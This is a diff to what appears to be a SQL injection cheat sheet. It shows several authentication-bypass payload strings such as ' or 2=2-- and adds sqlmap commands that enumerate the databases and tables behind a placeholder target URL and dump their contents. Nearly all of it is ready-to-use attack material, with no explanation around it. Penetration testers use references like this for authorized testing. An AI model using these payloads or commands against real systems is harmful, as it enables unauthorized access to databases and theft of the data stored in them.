@@ -172,3 +172,11 @@ admin’;--
 ‘ or 2=2--
 ‘ or 2-1=1--
 ‘ or 2>1--
+------------------------------------------------------------------------------------------------------
+
+# sqlmap
+
+sqlmap -u "http://target/index.html?page=1" --dbs --dump --batch                # Show all dbs
+sqlmap -u "http://target/index.html?page=1" -D <db> --tables --dump --batch     # Show all tables in a particular db
+sqlmap -u "http://target/index.html?page=1" -D <db> -T <table> --dump           # Dump all data in a particular table
+
